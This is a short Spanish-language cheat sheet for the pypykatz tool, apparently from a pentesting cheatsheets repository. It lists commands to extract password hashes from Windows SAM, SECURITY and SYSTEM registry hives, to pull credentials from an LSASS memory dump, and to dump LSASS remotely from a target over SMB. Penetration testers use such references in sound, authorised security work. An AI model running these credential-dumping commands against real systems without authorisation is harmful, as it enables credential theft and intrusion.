# pypykatz Cheat Sheet

#### Extraer Hashes de SAM & SYSTEM
```
pypykatz registry --sam <FILE-SAM> --security <FILE-SECURITY> <FILE-SYSTEM>
```

#### Extraer Hashes de SAM & SYSTEM y guardar los datos en un archivo en JSON
```
pypykatz registry --sam <FILE-SAM> --security <FILE-SECURITY> <FILE-SYSTEM> -o <OUTPUT> --json
```

#### Extraer credenciales desde un archivo de memoria
```
pypykatz lsa minidump <FILE-.dmp> -g -p wdigest
```

#### Dumperar LSASS remotamente
```
pypykatz live smb lsassdump <IP-TARGET>
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)